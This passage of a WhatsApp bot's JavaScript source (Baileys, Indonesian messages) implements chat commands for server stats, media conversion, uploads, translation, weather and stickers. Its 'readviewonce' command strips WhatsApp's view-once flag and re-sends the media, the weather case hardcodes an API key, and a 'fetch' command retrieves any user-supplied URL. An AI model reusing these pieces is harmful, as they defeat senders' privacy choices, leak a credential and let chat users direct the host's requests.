							}) : (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
							return `- ${key.charAt(0).toUpperCase() + key.slice(1)} : ${list}`;
						}).join('\n');
						sycreply(`Settings Bot @${botNumber.split('@')[0]}\n${settingsBot}`);
						break
					default:
					     
						if (teks[0] || teks[1]) sycreply(`*Please Sellect Settings :*\n- Mode : *${prefix + command} mode self/public*\n- Anti Call : *${prefix + command} anticall on/off*\n- Auto Bio : *${prefix + command} autobio on/off*\n- autoAi : ${prefix} *autoai on/off*\n- autoAi2 : ${prefix} *autoai2 on/off*\n- Auto Read : *${prefix + command} autoread on/off*\n- Auto Typing : *${prefix + command} autotyping on/off*\n- Auto VoiceNote : *${prefix + command} autovn on/off*\n- Read Sw : *${prefix + command} readsw on/off*`)
				}
				if (!teks[0] && !teks[1]) return sych.sendMessage(m.chat, {
					text: `*Bot Telah Online Selama*\n*${runtime(os.uptime())}*`
				}, {
					quoted: m
				})
			}
			break
			case 'ping':
			case 'botstatus':
			case 'statusbot': {
			     
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, {
					length
				}) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				await sych.sendMessage(m.chat, {
					react: {
						text: '💻', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan perintah
					}
				});
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(os.uptime())}\n\n💻 Info Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_NodeJS Memory Usaage_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				sycreply(respon)
			}
			break
			case 'speedtest':
			case 'speed': {
			     
				sycreply('Testing Speed...')
				let cp = require('child_process')
				let {
					promisify
				} = require('util')
				let exec = promisify(cp.exec).bind(cp)
				let o
				try {
					o = await exec('python3 speed.py --share')
				} catch (e) {
					o = e
				} finally {
					let {
						stdout,
						stderr
					} = o
					if (stdout.trim()) sycreply(stdout)
					if (stderr.trim()) sycreply(stderr)
				}
			}
			break
			case 'afk': {
			     
				let user = db.users[m.sender]
				user.afkTime = +new Date
				user.afkReason = text
				sycreply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`)
			}
			break
			case 'readviewonce':
			case 'readviewone':
			case 'rvo': {
			     
				if (!m.quoted) return sycreply(`Reply view once message\n*< / >* Example: ${prefix + command}`)
				try {
					if (m.quoted.msg.viewOnce) {
						m.quoted.msg.viewOnce = false
						await sych.sendMessage(m.chat, {
							forward: m.quoted
						}, {
							quoted: m
						})
					} else if (m.quoted.msg.message && m.quoted.msg.message.audioMessage && m.quoted.msg.message.audioMessage.viewOnce) {
						m.quoted.msg.message.audioMessage.viewOnce = false
						m.quoted.msg.message.audioMessage.contextInfo = {
							forwardingScore: 1,
							isForwarded: true,
							mentionedJid: [m.sender]
						}
						await sych.relayMessage(m.chat, m.quoted.msg.message, {})
					} else {
						sycreply(`Reply view once message\n*< / >* Example: ${prefix + command}`)
					}
				} catch (e) {
					sycreply('Media Tidak Valid!')
				}
			}
			break
			case 'inspect': {
			     
				if (!text) return sycreply('Masukkan Link Group!')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return sycreply('No invite url detected.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await sych.groupGetInviteInfo(code).then(anu => {
					let {
						id,
						subject,
						owner,
						subjectOwner,
						creation,
						desc,
						descId,
						participants,
						size,
						descOwner
					} = anu
					let par = `*Nama Gc* : ${subject}\n*ID* : ${id}\n${owner ? `*Creator* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Jumlah Member* : ${size}\n*Gc Dibuat Tanggal* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*Nama GC Diubah Oleh* : @${subjectOwner.split('@')[0]}` : '*Nama GC Diubah Oleh* : -'}\n${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					sych.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return sycreply('Grup Tidak Di Temukan❗');
					if (res.data == 410) return sycreply('Url Grup Telah Di Setel Ulang❗');
				});
			}
			break
			case 'addmsg': {
			     
				if (!m.quoted) return sycreply('Reply Pesan Yang Ingin Disave Di Database')
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} file name`)
				let msgs = db.database
				if (text.toLowerCase() in msgs) return sycreply(`'${text}' telah terdaftar di list pesan`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				sycreply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'\nAkses dengan ${prefix}getmsg ${text}\nLihat list Pesan Dengan ${prefix}listmsg`)
			}
			break
			case 'delmsg':
			case 'deletemsg': {
			     
				if (!text) return sycreply('Nama msg yg mau di delete?')
				let msgs = db.database
				if (text == 'allmsg') {
					db.database = {}
					sycreply('Berhasil menghapus seluruh msg dari list pesan')
				} else {
					if (!(text.toLowerCase() in msgs)) return sycreply(`'${text}' tidak terdaftar didalam list pesan`)
					delete msgs[text.toLowerCase()]
					sycreply(`Berhasil menghapus '${text}' dari list pesan`)
				}
			}
			break
			case 'getmsg': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
				let msgs = db.database
				if (!(text.toLowerCase() in msgs)) return sycreply(`'${text}' tidak terdaftar di list pesan`)
				await sych.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'listmsg': {
			     
				let seplit = Object.entries(db.database).map(([nama, isi]) => {
					return {
						nama,
						message: getContentType(isi)
					}
				})
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${i.message?.replace(/Message/i, '')}\n───────────────\n`
				}
				sycreply(teks)
			}
			break
		
// Case untuk listthumb
case 'listthumb': {
     
if (!isCreator) return sycreply(mess.owner)
    const thumbList = readThumbList();
    if (thumbList.length === 0) {
        return sycreply('Tidak ada thumbnail yang tersimpan.');
    }
    let teks = '「 LIST THUMBNAIL 」\n\n';
    for (let thumb of thumbList) {
        teks += `*Name:* ${thumb.name}\n*URL:* ${thumb.url}\n───────────────\n`;
    }
    sycreply(teks);
    break;
}

// Case untuk addthumb
case 'addthumb': {
     
if (!isCreator) return sycreply(mess.owner)
    if (!text) return sycreply(`*< / >* Example: ${prefix + command} thumbnail_name|image_url`);
    let [nama, url] = text.split('|');
    if (!nama || !url) return sycreply(`Please provide both name and URL in the correct format.`);
    
    const thumbList = readThumbList();
    if (thumbList.find(thumb => thumb.name === nama)) {
        return sycreply(`Thumbnail dengan nama '${nama}' sudah terdaftar.`);
    }

    thumbList.push({ name: nama, url: url });
    writeThumbList(thumbList);

    sycreply(`Thumbnail dengan nama '${nama}' berhasil ditambahkan!`);
    break;
}

// Case untuk delthumb
case 'delthumb':
case 'deletethumb': {
     
if (!isCreator) return sycreply(mess.owner)
    if (!text) return sycreply('Nama thumbnail yang ingin dihapus?');
    const thumbList = readThumbList();
    const index = thumbList.findIndex(thumb => thumb.name === text.toLowerCase());
    if (index === -1) return sycreply(`Thumbnail dengan nama '${text}' tidak ditemukan.`);
    
    thumbList.splice(index, 1);
    writeThumbList(thumbList);

    sycreply(`Thumbnail dengan nama '${text}' berhasil dihapus.`);
    break;
}
			case 'q':
			case 'quoted': {
			     
				if (!m.quoted) return sycreply('Reply Pesannya!')
				const anu = await m.getQuotedObj()
				if (!anu) return sycreply('Format Tidak Tersedia!')
				if (!anu.quoted) return sycreply('Pesan Yang Anda Reply Tidak Mengandung Reply')
				await sych.relayMessage(m.chat, {
					[anu.quoted.type]: anu.quoted.msg
				}, {})
			}
			break
			case 'confes':
			case 'confess':
			case 'menfes':
			case 'menfess': {
			     
				if (m.isGroup) return sycreply(mess.private)
				if (menfes[m.sender]) return sycreply(`Kamu Sedang Berada Di Sesi ${command}!`)
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} 62xxxx|Nama Samaran`)
				let [teks1, teks2] = text.split`|`
				if (teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await sych.onWhatsApp(tujuan)
					if (!onWa.length > 0) return sycreply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
					menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2 ? teks2 : 'Orang',
						waktu: setTimeout(() => {
							if (menfes[m.sender]) sycreply(`_Waktu ${command} habis_`)
							delete menfes[m.sender];
						}, 600000)
					};
					menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Penerima',
						waktu: setTimeout(() => {
							if (menfes[tujuan]) sych.sendMessage(tujuan, {
								text: `_Waktu ${command} habis_`
							});
							delete menfes[tujuan];
						}, 600000)
					};
					sych.sendMessage(tujuan, {
						text: `_${command} connected_\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`
					});
					sycreply(`_Memulai ${command}..._\n*Silahkan Mulai kirim pesan/media*\n*Durasi ${command} hanya selama 10 menit*\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`)
				} else {
					sycreply(`Masukkan Nomernya!\n*< / >* Example : ${prefix + command} 62xxxx|Nama Samaran`)
				}
			}
			break
			case 'delconfes':
			case 'delconfess':
			case 'delmenfes':
			case 'delmenfess': {
			     
				if (!menfes[m.sender]) return sycreply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`)
				let anu = menfes[m.sender]
				sych.sendMessage(anu.tujuan, {
					text: `Chat Di Akhiri Oleh ${anu.nama ? anu.nama : 'Seseorang'}`
				})
				sycreply(`Sukses Mengakhiri Sesi ${command.split('del')[1]}!`)
				delete menfes[anu.tujuan];
				delete menfes[m.sender];
			}
			break
			// Tools Menu
			case 'fetch':
			case 'get': {
			     
				if (!/^https?:\/\//.test(text)) return sycreply('Awali dengan http:// atau https://');
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/text|json|html|plain/.test(res.headers['content-type'])) {
						await sycreply(text)
					} else {
						sycreply(util.format(res.data))
					}
				} catch (e) {
					sycreply(util.format(e))
				}
			}
			break
			case 'toaud':
			case 'toaudio': {
			     
				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await sych.sendMessage(m.chat, {
					audio: audio,
					mimetype: 'audio/mpeg'
				}, {
					quoted: m
				})
			}
			break
			case 'tomp3': {
			     
				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await sych.sendMessage(m.chat, {
					document: audio,
					mimetype: 'audio/mpeg',
					fileName: `Convert By Sych Bot.mp3`
				}, {
					quoted: m
				})
			}
			break
			case 'restart':
			     
				if (!isCreator) return sycreply(mess.owner)
				sycreply(`restarting ${global.botname}`)
				sycreply(`Done ✅`)
				await sleep(3000)
				process.exit()
				break
			case 'tovn':
			case 'toptt':
			case 'tovoice': {
			     
				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				let media = await quoted.download()
				let audio = await toPTT(media, 'mp4')
				await sych.sendMessage(m.chat, {
					audio: audio,
					mimetype: 'audio/ogg; codecs=opus',
					ptt: true
				}, {
					quoted: m
				})
			}
			break
			case 'togif': {
			     
				if (!/webp|video/.test(mime)) return sycreply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				let media = await sych.downloadAndSaveMediaMessage(qmsg)
				let ran = `./database/sampah/${getRandom('.gif')}`;
				exec(`convert ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return sycreply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					sych.sendMessage(m.chat, {
						video: buffer,
						gifPlayback: true
					}, {
						quoted: m
					})
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toimage':
			case 'toimg': {
			     
				if (!/webp|video/.test(mime)) return sycreply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				let media = await sych.downloadAndSaveMediaMessage(qmsg)
				let ran = `./database/sampah/${getRandom('.png')}`;
				exec(`convert ${media}[0] ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return sycreply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					sych.sendMessage(m.chat, {
						image: buffer
					}, {
						quoted: m
					})
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toptv': {
			     
				if (!/video/.test(mime)) return sycreply(`Kirim/Reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await quoted.download()
					const msg = await generateWAMessageContent({
						video: anu
					}, {
						upload: sych.waUploadToServer
					})
					await sych.relayMessage(m.chat, {
						ptvMessage: msg.videoMessage
					}, {})
				} else {
					sycreply('Reply Video Yang Mau Di Ubah Ke PTV Message!')
				}
			}
			break
			case 'tourl': {
     
    try {
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            let key = "default_key"; // Inisialisasi key sebagai fallback
            let {
                key: responseKey
            } = await sycreply(mess.wait) || {}; // Mendapatkan key dari sycreply atau default
            if (responseKey) key = responseKey; // Gunakan key dari response jika ada

            // Emoji yang akan digunakan
            const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

            // Mengirimkan reaksi secara berurutan
            for (const emoji of reactEmojis) {
                await sych.sendMessage(m.chat, {
                    react: {
                        text: emoji,
                        key: m.key
                    }
                });
            }

            let media = await quoted.download();
            let anu = await UguuSe(media);
            // Mengedit pesan setelah URL dihasilkan
            sycreply('Url : ' + anu.url, {
                edit: key
            });
        } else {
            sycreply('Send Media yg ingin di Upload!');
        }
    } catch (e) {
        // Mengedit pesan error jika terjadi masalah
        sycreply('Server Uploader sedang offline!', {
            edit: key
        });
    }
}
break;
			case 'img2ibb': {
    try {
        if (!isRegistered){ return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');}
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            // Menambahkan pesan loading
            await sych.sendMessage(m.chat, {
                react: {
                    text: '⏳',
                    key: m.key
                }
            });

            // Unduh media
            let media = await quoted.download();
            let base64Media = media.toString('base64');

            // Kirim ke imgbb
            let response = await axios.post(
                'https://api.imgbb.com/1/upload',
                qs.stringify({
                    expiration: 31536000000, // 1000 tahun
                    key: ibbKey,
                    image: base64Media
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );

            // Ambil URL hasil
            let url = response.data.data.url;

            // Kirim URL ke pengguna
            sycreply(`Berhasil diunggah!\nURL: ${url}`);
        } else {
            sycreply('Harap kirim file media yang valid (jpg, png, dll.)!');
        }
    } catch (e) {
        console.error(e);
        sycreply('Terjadi kesalahan saat mengunggah file!');
    }
}
break;
case 'img2base64':
     
    if (!quoted || !quoted.message.imageMessage) {
        return sycreply("Silakan balas sebuah gambar untuk dikonversi ke Base64.");
    }
    const media = await sych.downloadMediaMessage(quoted);
    const base64Image = media.toString('base64');
    sycreply(`base642img ${base64Image}`);
    break;

case 'base642img':
    if (!isRegistered) {return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');}
    if (!text) {
    
        return sycreply("Silakan kirimkan Base64 untuk dikonversi menjadi gambar.");
    }

    const outputPath = './output_images/output_image.jpg';
    base64ToImg(text, outputPath);
    
    // Cek apakah file berhasil disimpan sebelum mengirimkan
    if (fs.existsSync(outputPath)) {
        await sych.sendMessage(m.chat, {
            image: fs.readFileSync(outputPath),
            caption: 'Berikut adalah gambar hasil konversi.'
        });
    } else {
        sycreply("Terjadi kesalahan dalam menyimpan gambar.");
    }
    break;
			case 'tiktokslide':
			case 'ttslide': {
			     
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				if (!text) {
					console.log('Teks URL TikTok tidak ditemukan.');
					return sycreply(`*< / >* Example: ${prefix + command} url_tiktok`);
				}
				if (!text.includes('tiktok.com')) {
					console.log('URL tidak valid, tidak mengandung hasil dari TikTok.');
					return sycreply('URL Tidak Mengandung Result Dari TikTok!');
				}
				try {
					console.log('Memulai proses pengunduhan dari URL TikTok:', text);
					const hasil = await tiktokDl(text);
					if (!hasil || hasil.data.length === 0) {
						console.log('Tidak ada gambar atau media yang ditemukan.');
						return sycreply('Tidak ada foto yang ditemukan!');
					}
					// Buat carousel card untuk setiap gambar
					const carouselCards = await Promise.all(hasil.data.map(async (item, index) => {
						// Mengonversi gambar ke URL menggunakan UguuSe
						let media = await fetch(item.url);
						let buffer = await media.buffer();
						let imageUrl = await UguuSe(buffer); // Proses untuk mendapatkan URL
						return {
							header: {
								title: `Foto ${index + 1}`,
								hasMediaAttachment: true,
								imageMessage: (await generateWAMessageContent({
									image: {
										url: item.url
									}
								}, {
									upload: sych.waUploadToServer
								})).imageMessage
							},
							body: {
								text: `Foto ${index + 1} dari TikTok✈️.`
							},
							footer: {
								text: "Klik tombol untuk melihat lebih detail."
							},
							nativeFlowMessage: {
								buttons: [{
									"name": "cta_url",
									"buttonParamsJson": JSON.stringify({
										display_text: "Lihat di TikTok",
										url: text
									})
								}, {
									"name": "cta_url",
									"buttonParamsJson": JSON.stringify({
										display_text: "Lihat Foto",
										url: imageUrl.url // URL gambar yang dihasilkan
									})
								}]
							}
						};
					}));
					// Buat pesan carousel
					const carouselMessage = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadata: {},
									deviceListMetadataVersion: 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.fromObject({
									body: {
										text: `Hasil foto dari TikTok: ${text}`
									},
									footer: {
										text: "TikTok Slide Bot by Sych"
									},
									header: {
										hasMediaAttachment: false
									},
									carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
										cards: carouselCards
									})
								})
							}
						}
					}, {});
					// Kirim pesan carousel
					await sych.relayMessage(m.chat, carouselMessage.message, {
						messageId: carouselMessage.key.id
					});
					console.log('Carousel dikirimkan dengan sukses.');
				} catch (e) {
					console.error('Gagal mengunduh atau membuat carousel:', e);
					sycreply('Gagal memproses permintaan Anda. Silakan coba lagi.');
				}
			}
			break;
			case 'img2text': {
				try {
					// Periksa apakah file media valid (gambar)
					if (/webp|jpg|jpeg|png/.test(mime)) {
						// Menambahkan pesan loading dan menyimpan key untuk edit nanti
						let {
							key
						} = await sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
						// Unduh media
						let media = await quoted.download();
						// Unggah media ke Uguu.se untuk mendapatkan URL
						let anu = await UguuSe(media);
						if (!anu.url) throw 'Gagal mengunggah media ke Uguu.se!';
						// Kirim URL ke API Anda
						let response = await fetch(`https://api.siputzx.my.id/api/ai/image2text?url=${anu.url}`);
						let result = await response.json();
						// Periksa respons API
						if (result.status && result.data) {
							// Terjemahkan hasil ke Bahasa Indonesia menggunakan translate-google-api
							let translatedText = await translate(result.data, {
								from: 'en',
								to: 'id'
							});
							// Kirim hasil terjemahan ke pengguna
							sycreply(`*Hasil Deskripsi Gambar (Bahasa Indonesia):*\n\n${translatedText}`, {
								edit: key
							});
						} else {
							sycreply('Gagal mendapatkan deskripsi gambar dari API!', {
								edit: key
							});
						}
					} else {
						sycreply('Kirim gambar yang ingin diubah menjadi teks!');
					}
				} catch (e) {
					// Tangani error dan kirim pesan jika ada masalah
					console.error(e);
					sycreply('Terjadi kesalahan saat memproses gambar!', {
						edit: key
					});
				}
			}
			break;
			case 'texttospech':
			case 'tts':
			case 'tospech': {
			     
				if (!text) return sycreply('Mana text yg mau diubah menjadi audio?')
				let {
					tts
				} = require('./lib/tts')
				let anu = await tts(text)
				sych.sendMessage(m.chat, {
					audio: anu,
					ptt: true,
					mimetype: 'audio/mpeg'
				}, {
					quoted: m
				})
			}
			break
			case 'translate':
			case 'tr': {
			     
				if (text && text == 'list') {
					let list_tr = `╭──❍「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────❍`;
					sycreply(list_tr)
				} else {
					if (!m.quoted && (!text || !args[1])) return sycreply(`Kirim/reply text dengan caption ${prefix + command}`)
					let lang = args[0] ? args[0] : 'id'
					let teks = args[1] ? args.slice(1).join(' ') : m.quoted.text
					try {
						let hasil = await translate(teks, {
							to: lang,
							autoCorrect: true
						})
						sycreply(`To : ${lang}\n${hasil[0]}`)
					} catch (e) {
						sycreply(`Lang *${lang}* Tidak Di temukan!\nSilahkan lihat list, ${prefix + command} list`)
					}
				}
			}
			break
			case 'toqr':
			case 'qr': {
			     
				if (!text) return sycreply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				await sych.sendMessage(m.chat, {
					image: {
						url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text
					},
					caption: 'Nih Bro'
				}, {
					quoted: m
				})
			}
			break
			case 'tohd':
			case 'remini':
			case 'hd': {
			     
				if (/image/.test(mime)) {
					let media = await quoted.download()
					remini(media, 'enhance').then(a => {
						sych.sendMessage(m.chat, {
							image: a,
							caption: 'Done'
						}, {
							quoted: m
						});
					}).catch(e => sycreply('Server sedang offline!'));
				} else {
					sycreply(`Kirim/Reply Gambar dengan format\n*< / >* Example: ${prefix + command}`)
				}
			}
			break
			case 'shutdown': {
			     
				if (!isCreator) {
					return sycreply('Hanya pemilik bot yang dapat mengeksekusi perintah ini.');
				}
				await sych.sendMessage(m.chat, {
					text: 'Bot sedang dimatikan...'
				}, {
					quoted: m
				});
				process.exit(); // Menghentikan bot
			}
			break;
			case 'ssweb': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/naze-md`)
				try {
					let anu = 'https://' + text.replace(/^https?:\/\//, '')
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + anu
						},
						caption: 'Done'
					}, {
						quoted: m
					})
				} catch (e) {
					sycreply('Server SS web Sedang Offline!')
				}
			}
			break
			case 'readmore': {
			     
				let teks1 = text.split`|` [0] ? text.split`|` [0] : ''
				let teks2 = text.split`|` [1] ? text.split`|` [1] : ''
				sycreply(teks1 + readmore + teks2)
			}
			break
			case 'getexif': {
			     
				if (!m.quoted) return sycreply(`Reply sticker\nDengan caption ${prefix + command}`)
				if (!/sticker|webp/.test(quoted.type)) return sycreply(`Reply sticker\nDengan caption ${prefix + command}`)
				const img = new webp.Image()
				await img.load(await m.quoted.download())
				sycreply(util.format(JSON.parse(img.exif.slice(22).toString())))
			}
			break
			case 'cuaca':
			case 'weather': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} jakarta`)
				try {
					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
					sycreply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
				} catch (e) {
					sycreply('Kota Tidak Di Temukan!')
				}
			}
			break
			case 'sticker':
case 'colong':
case 's': {
     
    try {
    
        console.log('Memulai proses konversi ke stiker...');

        // Cek tipe mime yang didukung
        if (!/image|video|webp|gif/.test(mime)) {
            console.log('Mime tipe tidak valid, harus image, video, gif, atau webp.');
            return sycreply(`Kirim/reply image/video/gif/sticker untuk mengonversi ke stiker.`);
        }
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
        // Unduh media yang direply
        let media = await quoted.download();
        console.log('Media berhasil diunduh.');

        
        console.log('Reaksi berhasil diberikan pada pesan.');

        const { exec } = require('child_process');
        const fs = require('fs');

        // Jika media berupa video/gif
        if (/video|gif/.test(mime)) {
            console.log('Memproses media video atau gif...');
            
            // Simpan sementara file video
            const inputPath = './temp/input.mp4';
            const outputPath = './temp/output.webp';
            fs.writeFileSync(inputPath, media);

            // Konversi video ke WebP dengan FFmpeg (potong durasi ke 6 detik)
            exec(`ffmpeg -i ${inputPath} -t 6 -vf "scale=512:512" -loop 0 -preset default -an -vsync 0 ${outputPath}`, async (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat mengonversi video/gif ke stiker:', err);
                    return sycreply('Gagal mengonversi video/gif ke stiker!');
                }

                console.log('Video berhasil dikonversi ke WebP.');

                // Kirim sebagai stiker animasi
                let buffer = fs.readFileSync(outputPath);
                await sych.sendAsSticker(m.chat, buffer, m, {
                    packname: global.packname,
                    author: global.author
                });
                console.log('Stiker animasi berhasil dikirim.');

                // Hapus file sementara
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            });

